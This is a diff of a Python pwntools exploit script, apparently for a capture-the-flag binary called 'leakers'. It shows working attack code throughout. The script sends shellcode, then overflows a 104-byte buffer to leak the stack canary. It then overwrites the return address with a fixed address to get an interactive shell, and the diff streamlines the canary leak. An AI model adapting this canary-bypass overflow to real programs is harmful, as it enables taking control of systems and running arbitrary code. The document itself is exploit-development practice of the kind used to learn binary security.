@@ -19,8 +19,6 @@ if(len(sys.argv) > 1):
 else:
 	p = process("./leakers")
 
-cyclic = cyclic_gen()
-
 asm_code = """
 lea rax, [rip]
 add rax, 0x16
@@ -35,17 +33,17 @@ syscall
 sh = asm(asm_code)
 
 p.sendline(sh)
-input("send second input")
-p.send(cyclic.get(105))
-p.recvuntil(b'aaazaabb')
+time.sleep(0.1)
 
-canary = b"\x00" + p.recv(7)
-print(b'canary: ' + canary)
-print('len(canary) = ', len(canary))
+p.send(b'A'*104 + b'B')
+p.recvuntil(b'B')
 
-input("send third input")
-p.send(b'A'*104 + canary + b'A'*8 + p64(0x00404080))
-input("send fourth input")
+canary = u64(b"\x00" + p.recv(7))
+print('leak canary: %#x' % canary)
+
+p.send(b'A'*104 + p64(canary) + b'A'*8 + p64(0x00404080))
+
+time.sleep(0.1)
 p.sendline()
 
 p.interactive()
